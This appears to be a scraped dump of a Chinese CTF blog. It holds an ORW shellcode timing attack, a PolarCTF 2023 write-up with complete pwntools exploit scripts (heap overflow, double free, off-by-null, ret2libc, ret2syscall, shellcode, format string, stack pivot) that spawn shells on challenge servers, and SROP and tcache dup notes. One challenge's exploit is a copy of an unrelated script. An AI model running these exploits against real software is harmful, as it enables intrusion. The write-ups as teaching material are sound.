/*set r8*/pop raxxor al,0x40push raxpop r8push rax /*set r9*/pop r9/*syscall*/push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x31],clpush 0x5fpop rcxxor byte ptr[rax+0x32],clpush 0x22 /*set rcx*/pop rcxpush 0x40/*set rax*/pop raxxor al,0x49'''shellcode_read = '''/*read(0,0x40404040,0x70)*/push 0x40404040 /*set rsi*/pop rsipush 0x40 /*set rdi*/pop raxxor al,0x40push raxpop rdixor al,0x40 /*set rdx*/push 0x70pop rdx/*syscall*/push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x57],clpush 0x5fpop rcxxor byte ptr[rax+0x58],clpush rdx /*set rax*/pop raxxor al,0x70'''shellcode_retfq = '''/*mode_64 -&gt; mode_32*/push rbxpop raxxor al,0x40push 0x72pop rcxxor byte ptr[rax+0x40],clpush 0x68pop rcxxor byte ptr[rax+0x40],clpush 0x47pop rcxsub byte ptr[rax+0x41],clpush 0x48pop rcxsub byte ptr[rax+0x41],clpush rdipush rdipush 0x23push 0x40404040pop raxpush rax'''def pwn(p, index, ch):    shellcode = ''    # mmap    shellcode += shellcode_mmap    shellcode += append    # read shellcode    shellcode += shellcode_read    shellcode += append    # mode_64 -&gt; mode_32    shellcode += shellcode_retfq    shellcode += append    shellcode = asm(shellcode,arch = 'amd64',os = 'linux')    #print hex(len(shellcode))    p.sendline(shellcode)    time.sleep(0.05)    shellcode_flag =\"\"\"    push 0x33    push 0x40404089    retfq        /*read(fp,buf,0x70)*/    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    loop:    cmp byte ptr[rsi+{0}], {1}    jz loop    ret    \"\"\".format(index, ch)    shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')    p.sendline(shellcode_x86 + 0x29*'\\x90' + shellcode_flag)flag = \"\"index = 0last = 'a'while True:    update = False    for ch in range(32,127):        sh = process(\"./shellcode\")        pwn(sh, index, ch)        start = time.time()        try:            sh.recv(timeout=2)        except:            pass        end = time.time()        sh.close()        if(end-start &gt; 1.5):            flag += chr(ch)            last = chr(ch)            update = True            print(\"[ flag + 1 !!! ] \" + flag)            break        assert(update == True)        if(last == '}'):        break        index += 1print(\"flag: \" + flag)","categories":["pwn 进阶"],"tags":["orw"]},{"title":"PolarCTF_2023_wp","url":"/2023/09/27/PolarCTF_2023_wp/","content":"PWN\n记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待12月份的Polar D&amp;N的冬季赛！\n\n\n最后每道题目都有官方视频讲解，链接 【PWN】小狗汪汪汪_哔哩哔哩_bilibili\nemo_chunk程序保护Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n解题思路\n堆溢出，可以通过溢出chunk内容，从而修改下一个chunk的size字段，制造堆块重叠，将下一个chunk大小改为small chunk，这样free掉之后，会放入unsortedbin中，fd和bk都指向main_arena_88\n然后可以通过打印函数泄露libc地址\n利用fastbin的特性，向malloc_hook-0x23的位置申请chunk，覆写malloc_hook\n\n\n注意一般思路是这样的，但是题目具体要使用realloc_hook来进行调栈，具体操作为改realloc_hook为onegadget，malloc_hook为realloc_hook，这样执行malloc时，会实现二级跳。malloc_hook -&gt; realloc_hook -&gt; onegadget\n\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *#p = remote('123.60.135.228',2094)context(log_level = 'debug', os = 'linux', arch = 'amd64')def connect():    global p,elf,libc    p = process('./emo_chunk')    #p = remote('123.60.135.228',2064)    elf = ELF('./emo_chunk')    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def cmd(xuhao):    p.recvuntil('Please Choice!\\n')    p.sendline(xuhao)def add(size):    cmd(\"1\")    p.recvuntil('Please Input Size:\\n')    p.sendline(str(size))def delete(index):    cmd(\"2\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def edit(index,content):    cmd(\"3\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))    p.recvuntil('Change EMo Content\\n')    p.send(content)def show(index):    cmd(\"4\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def exit():    cmd(\"5\")def debug():    gdb.attach(p)    pause()def pwn(i,j):    heaparray = 0x6020E0    backdoor = 0x400946    free_got = elf.got['free']    #创建几个chunk    add(0x68) #0    add(0x68) #1    add(0x68) #2    add(0x68) #3    add(0x68) #4    add(0x68) #5 隔离top chunk    #泄露libc    edit(0,'a'*0x68 + '\\xe1' + '\\x00'*7)    delete(1)    #debug()    add(0x68) #1    show(2)    libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 0x3c4b78    print(\"libc_base -&gt; \",hex(libc_base))    #计算地址    malloc_hook = libc_base + libc.sym['__malloc_hook']    realloc = libc_base + libc.sym['realloc']    one = [0x45226,0x4527a,0xf03a4,0xf1247]    one_gadget = libc_base + one[i]    delete(4)    edit(3,'a'*0x68 + p64(0x71) + p64(malloc_hook - 0x23))    #debug()    add(0x68) #4    add(0x68) #malloc 6    #思路1,将malloc_hook改成one_gadget，但是打不通    #payload = 'a'*(0x23-0x10) + p64(one_gadget)    #思路2,将realloc_hook改成one_gadget,调栈    #payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc + j) #将malloc_hook修改成realloc_hook    #思路3,题目有后门,直接改malloc_hook为后门函数    payload = 'a'*(0x23-0x10) + p64(backdoor)    edit(6,payload)    add(0x68)    p.interactive()# for i in range(4):#     for j in [2,4,6,8,10]:#         try:#             print(\"i :\",i)#             print(\"j :\",j)#             p = process('./emo_chunk')#             pwn(i,int(j))#         except:#             p.close()#注释为暴力调栈,得出i = 1, j = 8connect()pwn(1,8)'''0x45226\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  rax == NULL0x4527a\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4\texecve(\"/bin/sh\", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247\texecve(\"/bin/sh\", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''\n\n\n\ndouble  free程序保护Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n解题思路double free 可以申请任何我们想要的地址的一个chunk，进而修改内容，本题目就是修改bss段上的值为固定值，进而getshell，具体做法就是申请2个chunk，制造double ，free，形成chunk 1 -&gt; chunk 2 &lt;- chunk 1，修改chunk 1 的指向为目标地址，然后通过连续的malloc 4次，既可申请到目标地址，最后修改chunk内容即可\nexp#!/usr/bin/env python# coding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = process('./heap_Double_Free')#p = remote('123.60.135.228',2133)def cmd(xuhao):    p.recvuntil('root@ubuntu:~/Desktop$ ')    p.sendline(xuhao)def create(id,size,content):    cmd(\"1\")    p.recvuntil('please input id and size :\\n')    p.sendline(str(id))    p.sendline(str(size))    p.sendline(content)def free(id):    cmd(\"2\")    p.sendline(str(id))def show(id):    cmd(\"3\")    p.sendline(str(id))def getshell():    cmd(\"4\")def debug():    gdb.attach(p)goal = 0x6010b0 #将这里的值改为 257fd = 0x6010b0create(0,0x68,'aaaa') #0create(1,0x68,'bbbb') #1#create(2,16,'cccc') #2 防止和topchunk合并#debug()#double freefree(0)free(1)free(0)#debug()create(3,0x68,p64(goal-0x10)) #3create(4,0x68,'aaaa') #4create(5,0x68,'aaaa') #5#debug()create(6,0x68,p64(0x101)) #6debug()getshell()p.interactive()\n\neasychunk程序保护Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\n解题思路offbynull \n\n申请4个chunk，free掉chunk 0。然后编辑chunk1，覆写chunk2的prev_size为chunk0 + chun1，size低位为0，表示前面的chunk为free chunk\nchunk 0 chunk 1 会合并，但是 chunk 1 始终存在，合并后放入了unsorted bin 中，申请一个同样大小的chunk 5收回chunk0，这样chunk 1的fd 和bk都是main_arena_88，泄露libc地址\n最后通过fastbin向malloc_hook-0x23申请地址，最后修改malloc_hook 为 og\n\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *#p = remote('123.60.135.228',2094)context(log_level = 'debug', os = 'linux', arch = 'amd64')def connect():    global p,elf,libc    local = 0    if local:        p = process('./easychunk')    else:        p = remote('123.60.135.228',2114)    elf = ELF('./easychunk')    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def cmd(xuhao):    p.recvuntil('Please Choice!\\n')    p.sendline(xuhao)def add(size,content):    cmd(\"1\")    p.recvuntil('Please give me a name for item:\\n')    p.sendline('aaaa')    p.recvuntil('Please Input Size:\\n')    p.sendline(str(size))    p.recvuntil('Content of Emo!:\\n')    p.send(content)def delete(index):    cmd(\"2\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def edit(index,content):    cmd(\"3\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))    p.recvuntil('Change EMo Content\\n')    p.send(content)def show(index):    cmd(\"4\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def exit():    cmd(\"5\")def debug():    gdb.attach(p)    pause()def pwn():    dem = \"hello,everyone.Welcome to:Polar D&amp;N:\"    p.recvuntil('Where are you from?\\n')    p.sendline(dem)    #申请几个chunk    add(0xf8,\"aaaa\") #0    add(0xf8,\"bbbb\") #1    add(0xf8,\"cccc\") #2    add(0xf8,\"dddd\") #3    #free掉chunk0    delete(0) #0    #通过编辑chunk1溢出chunk2的size的inues位为0,注意chunk2的prevsize位为chunk0size+chunk2size    pay0 = 'a'*0xf0 + p64(0x200)    edit(1,pay0)    delete(2) #2    #泄露libc    add(0xf8,\"aaaa\") #0    show(1)    p.recvuntil('content:\\n')    main_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))    #print(\"main_arena88\",hex(main_arena))    libc_base = main_arena - 0x3c4b78    print(\"libc_base\", hex(libc_base))    malloc_hook = libc_base + libc.sym['__malloc_hook']    realloc_hook = libc_base + libc.sym['realloc']    one = [0x45226,0x4527a,0xf03a4,0xf1247]    one_gadget = libc_base + one[1]    #修改chunk1的fd改为malloc_hook - 0x23    add(0x68,b'aaa') #2-&gt;1    delete(2)    edit(1,p64(malloc_hook-0x23))    add(0x68,'aaaa') #2    payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc_hook+8)    #debug()    add(0x68,payload)    cmd(\"1\")    p.recvuntil('Please give me a name for item:\\n')    p.sendline('aaaa')    p.interactive()connect()pwn()# for i in range(4):#     for j in [2,4,6,8,10]:#         try:#             print(\"i :\",i)#             print(\"j :\",j)#             p = process('./emo_chunk')#             pwn(i,int(j))#         except:#             p.close()#注释为暴力调栈,得出i = 1, j = 8'''0x45226\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  rax == NULL0x4527a\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4\texecve(\"/bin/sh\", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247\texecve(\"/bin/sh\", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''\n\n\n\nfish程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n解题思路函数存在gets，溢出控制返回地址为bss段上再执行一次gets。直接溢出输入system(“/bin/sh”)\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearcherp = remote('123.60.135.228',2060)#p = process('./fish')context(log_level = 'debug', os = 'linux', arch = 'i386')elf = ELF('./fish')sys = elf.plt['system']print(hex(sys))get_plt = elf.plt['gets']print(hex(get_plt))puts_plt = elf.plt['puts']puts_got = elf.got['puts']bss = 0x0804A040p.sendline(\"123\")payload = b'a'*0x112 + p32(get_plt) + p32(sys) + p32(bss) + p32(bss)p.recvuntil(b'How many fish does the kitten eat\\n')p.sendline(payload)p.sendline(b'/bin/sh')p.interactive()\n\n\n\nformat_ret2libc程序保护Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n解题思路ret2libc\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2107)#p = process('./format_ret2libc')context(log_level = 'debug', os = 'linux', arch = 'amd64')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')elf = ELF('./format_ret2libc')puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]vuln_addr = 0x40084Bpop_rdi_ret = 0x0000000000400943payload1 = \"%39$p\"#p.recvuntil(\"Say some words\\n\")p.sendline(payload1)p.recvuntil(\"0x\")canary = int(p.recv(16), 16)print(hex(canary))payload2 = b\"a\" * (0x70-8) + p64(canary) + b\"a\" * 8payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)p.sendlineafter(\"What's your name?\\n\", payload2)puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))log.info(\"puts_addr -&gt; %x\",puts_addr)# libcbase = puts_addr - libc.symbols['puts']# system_addr = libcbase + libc.symbols['system']# binsh_addr = libcbase + next(libc.search(\"/bin/sh\"))# libc = LibcSearcher('puts', puts_addr)# libcbase = puts_addr - libc.dump('puts')# system_addr = libcbase + libc.dump('system')# binsh_addr = libcbase + libc.dump('str_bin_sh')libc = puts_addr - \t0x06f6a0system_addr = libc + 0x0453a0binsh_addr = libc + 0x18ce57payload3 = b\"a\" * (0x70-8) + p64(canary) + b\"a\" * 8payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)p.sendlineafter(\"What's your name?\\n\", payload3)p.interactive()\n\n\n\nGame程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n解题思路ret2libc\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearchercontext(log_level = 'debug', os = 'linux', arch = 'amd64')p = remote('123.60.135.228',2064)#p = process('./Game')elf = ELF('./Game')puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = elf.symbols['main']start = 0x080485F4offset = 0x64 + 8 + 4p.recvuntil('Do you play game?\\n')p.sendline(\"yes\")p.recvuntil('Do you think playing games will affect your learning?\\n')p.sendline(\"yes\")p.recvuntil(\"I think the same as you!\\n\")payload = b'a'*offset + p32(puts_plt) + p32(start) + p32(puts_got)#payload = p32(puts_got)#gdb.attach(p)p.sendline(payload)p.recvuntil('\\n')puts_addr = u32(p.recv()[0:4])log.info('puts -&gt; %x',puts_addr)# libc = LibcSearcher('puts', puts_addr)# libcbase = puts_addr - libc.dump('puts')# system_addr = libcbase + libc.dump('system')# binsh_addr = libcbase + libc.dump('str_bin_sh')libc = puts_addr - 0x05f150system_addr = libc + 0x03a950binsh_addr = libc + 0x15912bp.recvuntil(\"I think the same as you!\\n\")payload2 = b'a'* offset + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)p.sendline(payload2)p.interactive()\n\n\n\nname4程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n\n解题思路绕过检查的shellcode\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2116)#p = process('./name4')context(log_level = 'debug', os = 'linux', arch = 'i386')elf = ELF('./name4')shellcode = asm(shellcraft.sh())p.recvuntil(\"Enter your name:\\n\")p.sendline('\\x00'+shellcode)goal = 0x0804A0E0goal1 = 0x0804A080 + 1p.recvuntil('Enter your best friend name:\\n')p.sendline(shellcode)p.recvuntil('give you stack overflow:\\n')payload = 'a'*0x20 + p32(0xdeadbeff) + p32(goal)#gdb.attach(p)p.sendline(payload)p.interactive()\n\n\n\nplay程序保护Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments\n\n解题思路通过往bss段上写shellcode再跳转执行\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *p = remote('123.60.135.228',2063)#p = process('./play')context(log_level = 'debug', os = 'linux', arch = 'amd64')elf = ELF('./play')shellcode = asm(shellcraft.sh())p.recvuntil(\"I think you must enjoy playing.\\n\")p.sendline(shellcode)goal = 0x6010A0p.recvuntil('Name your favorite game?\\n')payload = b'a'*(0x30+8) + p64(goal)#gdb.attach(p)p.sendline(payload)p.interactive()\n\n\n\nret2syscall程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n\n解题思路ret2syscall 32位的执行 (0xb，0，0，binsh) 再调用80号中断\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearcherp = remote('123.60.135.228',2109)#p = process('./ret2syscall_32')context(log_level = 'debug', os = 'linux', arch = 'i386')elf = ELF('./ret2syscall_32')offset = 0x208 + 4binsh_addr = 0x080EA068pop_eax = 0x080b8576pop_edx_ecx_ebx = 0x0806f250int80_addr = 0x0806cea3payload = b'a'*offset + p32(pop_eax) + p32(0xb)payload += p32(pop_edx_ecx_ebx) + p32(0x0) + p32(0x0) + p32(binsh_addr) + p32(int80_addr)p.sendline(payload)p.interactive()\n\n\n\nsleep程序保护Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n解题思路ret2libc\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2057)#p = process('./sleep')context(log_level = 'debug', os = 'linux', arch = 'amd64')#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')elf = ELF('./sleep')puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]vuln_addr = 0x4006BDpop_rdi_ret = 0x0000000000400783payload2 = b\"a\" * (0x70+8)payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)p.sendlineafter(\"Please cherish every second of sleeping time !!!\\n\", payload2)puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))log.info(\"puts_addr -&gt; %x\",puts_addr)# libcbase = puts_addr - libc.symbols['puts']# system_addr = libcbase + libc.symbols['system']# binsh_addr = libcbase + next(libc.search(\"/bin/sh\"))# libc = LibcSearcher('puts', puts_addr)# libcbase = puts_addr - libc.dump('puts')# system_addr = libcbase + libc.dump('system')# binsh_addr = libcbase + libc.dump('str_bin_sh')libc = puts_addr - \t0x06f6a0system_addr = libc + 0x0453a0binsh_addr = libc + 0x18ce57payload3 = b\"a\" * (0x70+8)payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)p.sendlineafter(\"Please cherish every second of sleeping time !!!\\n\", payload3)p.interactive()\n\n\n\nstackpivot_x86程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n解题思路栈迁移蛮有意思的，结构b’a’*padding + p64(goal) + p64(leave_ret)，通过执行两次 leave ; ret 将栈迁移到目标位置\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *#p = remote('123.60.135.228',2131)p = process('./stack_pivotingx86')context(log_level = 'debug', os = 'linux', arch = 'i386')binsh = 0x0804A030system_addr = 0x08048579leave_ret = 0x080484d8offset = 0xffffd028 - 0xffffcff0 #ebp距离输入地址的值pay = b'a'*0x27 + b'b'p.send(pay)p.recvuntil('b')ebp_addr = u32(p.recv(4))print(\"ebp_addr -&gt; \",hex(ebp_addr)) #泄露ebps_addr = ebp_addr - 0x38 #计算ebp 和 输入 的距离pay1 = p32(0)pay1 += p32(system_addr)pay1 += p32(binsh)pay1 += p32(0)pay1 = pay1.ljust(0x28,b'\\x00')pay1 += p32(s_addr)pay1 += p32(leave_ret)gdb.attach(p)p.send(pay1)p.interactive()\n\n\n\n夕阳下的舞者程序保护Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\n解题思路题目主要类型为offbynull制造堆块重叠，函数结构比较复杂，需要ida逆向理清，这里提供简单思路\n\nStep1：泄露libc基址。申请chunk，正常释放，大于fastbin的chunk会被放入unsortedbin中，且fd和bk均指向于main_arena_88的位置，可以获得libc基址\nStep2：泄露堆地址。为啥泄露堆地址，因为开启了PIE，创建2个不相邻的 small chunk，释放后会放到 unsoted bin 中，通过打印函数可以泄露地址。\nStep3：off-by-null，getshell 利用off-by-null漏洞制造堆块重叠，用fastbin去申请mallochook-0x23位置的一个chunk去修改mallochook为og\n\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *#p = remote('123.60.135.228',2131)p = process('./stack_pivotingx86')context(log_level = 'debug', os = 'linux', arch = 'i386')binsh = 0x0804A030system_addr = 0x08048579leave_ret = 0x080484d8offset = 0xffffd028 - 0xffffcff0 #ebp距离输入地址的值pay = b'a'*0x27 + b'b'p.send(pay)p.recvuntil('b')ebp_addr = u32(p.recv(4))print(\"ebp_addr -&gt; \",hex(ebp_addr)) #泄露ebps_addr = ebp_addr - 0x38 #计算ebp 和 输入 的距离pay1 = p32(0)pay1 += p32(system_addr)pay1 += p32(binsh)pay1 += p32(0)pay1 = pay1.ljust(0x28,b'\\x00')pay1 += p32(s_addr)pay1 += p32(leave_ret)gdb.attach(p)p.send(pay1)p.interactive()\n\n\n\ntest_format程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n解题思路格式化字符串漏洞，修改任意位置的值\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2121)#p = process('./test_format')context(log_level = 'debug', os = 'linux', arch = 'amd64')elf = ELF('./test_format')goal = 0x0804A030payload = 'aaaa%8$n' + p64(goal)p.sendline(payload)p.interactive()\n\n\n\nheap_Easy_Uaf程序保护Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n解题思路漏洞存在于Are()函数中，函数malloc了一个0x71大小的堆块，但是并没有清0，存在释放后使用的可能性。在之后申请了一个chunk b，chunk b的内容存在堆溢出。我这里的思路就是如果在a的上方有个大小小于0x71，释放的chunk，程序会将b申请到a的上方，这样通过堆溢出可以修改a的内容为”Flag”，官方做法是直接 将申请的b在a中，填写b的内容为Flag也可以！\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2094)#p = process('./heap_Easy_Uaf')context(log_level = 'debug', os = 'linux', arch = 'amd64')elf = ELF('./heap_Easy_Uaf')#heaparray = 0x602100def cmd(xuhao):    p.recvuntil('Please Choice!\\n')    p.sendline(xuhao)def add(size,content):    cmd(\"1\")    p.recvuntil('Please Input Size:\\n')    p.sendline(str(size))    p.recvuntil('Content of Emo!:')    p.sendline(content)def delete(index):    cmd(\"2\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def edit(index,content):    cmd(\"3\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))    p.recvuntil('Change EMo Content\\n')    p.send(content)def show(index):    cmd(\"4\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def amaze(size,content):    cmd(\"5\")    p.recvuntil('Please Input Chunk size :\\n')    p.sendline(str(size))    p.recvuntil('Please Input Content : \\n')    p.sendline(content)def exit():    cmd(\"6\")def debug():    gdb.attach(p)    pause()heap_ptr = 0x602100shell=0x400A16add(8,'aaaa') #0add(8,'aaaa') #1#debug()amaze(8,'')#debug()delete(1)#debug()pay = 'a'*0x18 + p64(0x71) + \"Flag\"amaze(8,pay)p.interactive()\n\n\n\n小狗汪汪汪程序保护Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n\n解题思路ret2text\nexp#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *p = remote('123.60.135.228',2133)#p = process('./woof')context(log_level = 'debug', os = 'linux', arch = 'i386')backdoor = 0x0804859Bp.recvuntil(b'This puppy needs to eat a few bones?\\n')payload = b'a'*(0x9+4) + p32(0x0804859B)p.sendline(payload)p.interactive()\n\n\n\n\n\n","categories":["wp"],"tags":["wp"]},{"title":"SROP","url":"/2023/10/25/SROP/","content":"高级ROP-SROP之前一直没掌握SROP技术，以此篇重新学习一下SROP\n利用工具在目前的pwntools中已经集成了对于srop的攻击。\n使用情况在汇编代码中看到存在systemcall的时候可以考虑采用该方法进行尝试\n下面给出我们将会用到的64位函数及函数调用号和函数原型\n\n\n\n系统调用\n调用号\n函数原型\n\n\n\nread\n0\nread( int fd, void *buf, size_t count )\n\n\nwrite\n1\nwrite( int fd, const void *buf, size_t count )\n\n\nsigreturn\n15\nint sigreturn( … )\n\n\nexecve\n59\nexecve( const char *filename, char *const argv[], char *const envp[] )\n\n\n###使用sigreturn对read函数调用的寄存器进行部署接下来就需要注意了，我们进入构造的阶段。我们需要通过sigreturn的调用来实现对read函数调用寄存器的部署。值得高兴的是pwntools中已经有了调用sigreturn的功能，所以在写EXP的时候可以直接使用。再部署之前我们需要之想好在哪几个寄存器中部署什么值，下面列出来一一讲解\n\n\n\n寄存器和指令\n存储数据\n\n\n\nrax\n系统调用号\n\n\nrdi\n0\n\n\nrsi\naddr\n\n\nrdx\nlen\n\n\nrsp\naddr\n\n\nrip\nsyscall_ret\n\n\n\n首先是rax寄存器中一定是存放read函数的系统调用号啦，因为原汇编代码使用的是syscall，这个不多说了●rdi寄存器作为read函数的一参，0代表标准输入●rsi寄存器作为read函数的二参，里面存放的是前面通过write函数打印出来的新栈顶的地址，也就是说将接收到的信息写到我们前面通过write函数打印的新栈顶的位置●rdx作为read函数的三参写0x400个字节●rsp寄存器需要和rsi保持一致，在写的时候写在rsp指向的位置●rip寄存器指向syscall_ret，确保在read函数寄存器部署成功之后可以直接调用read函数\n\n","categories":["pwn 进阶"],"tags":["SROP"]},{"title":"Tcache Attack中的Tcache dup（基础）","url":"/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/","content":"Tcache Attack中的Tcache dup（基础）\n参考资料：CTF-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup代码汉化：@yichen：https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g附件：链接: https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA  密码: u7pc–来自百度网盘超级会员V3的分享\n\n漏洞原理\n这里使用libc-2.27.so的源码进行分析\n\nTcache dup利用的是tcache_put()函数的不严谨：\n#代码第2923-2933行：/* Caller must ensure that we know tc_idx is valid and there's room   for more chunks.  */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}\n\n从上面的代码可以看出，在libc-2.27版本中没有对tcache_put函数进行检查，甚至没有对tcache-&gt;counts[tc_idx] 的检查，在大幅度提高性能的同时安全性也下降来许多。因为在这个函数中没有任何的检查，所以我们可以直接对同一个chunk进行多次free，造成cyclical list。\n\nTcache dup类似于之前fastbin_attack中的double free，但是后者的检查要更多。\n\nDemo接下来我们使用一个demo来进行说明。\n//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, \"先申请一块内存\\n\");    int *a = malloc(8);    fprintf(stderr, \"申请的内存地址是: %p\\n\", a);    fprintf(stderr, \"对这块内存地址 free两次\\n\");    free(a);    free(a);    fprintf(stderr, \"这时候链表是这样的 [ %p, %p ].\\n\", a, a);    fprintf(stderr, \"接下来再去 malloc 两次: [ %p, %p ].\\n\", malloc(8), malloc(8));    fprintf(stderr, \"Finish!!!\\n\");    return 0;}\n\n编译完成之后，使用pwndbg调试程序，首先对代码的第12行下断点，然后开始调试程序，此时的内存状况如下：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x601250Size: 0x21Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct......(省略内容均为空)0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000000000\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......(省略内容均为空)0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; bintcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 